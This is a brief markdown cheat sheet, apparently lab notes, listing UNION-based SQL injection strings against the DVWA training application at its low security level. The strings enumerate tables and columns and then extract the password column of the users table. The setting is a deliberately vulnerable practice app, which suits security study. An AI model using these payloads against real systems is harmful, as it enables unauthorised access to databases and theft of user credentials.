# CyberSecurity

<h3>low security level</h3>

- To find all tables, from a database called “dvwa”: 
`1' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema = 'dvwa'#`

 - To find all columns, from the database called “dvwa”: `1' UNION SELECT column_name,null FROM information_schema.columns WHERE table_schema ='dvwa'#`

 - To find all column names of the table named “users”, from a database called “dvwa”: `1' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name = 'users' AND table_schema = 'dvwa'#`

 - To get the content of one column of the table named “users”, from a database called “dvwa”: `1' UNION SELECT password,null FROM dvwa.users#`
